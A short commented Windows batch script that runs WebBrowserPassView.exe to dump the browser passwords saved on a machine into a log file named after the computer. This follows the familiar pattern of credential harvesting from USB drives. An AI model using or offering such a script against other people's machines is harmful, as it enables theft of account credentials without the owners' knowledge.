@echo off
:: Echo makes the command prompt window blank. You can try remove this to see what happens.

mkdir log
:: Creates a folder called log only if the folder does not already exist.

:: The command below runs WebBrowserPassView.exe and exports the results as text documents using the naming conventione WebBrowserPassView.exe-ComputerName
start WebBrowserPassView.exe /stext .\log\WebBrowserPassView-%computername%.txt
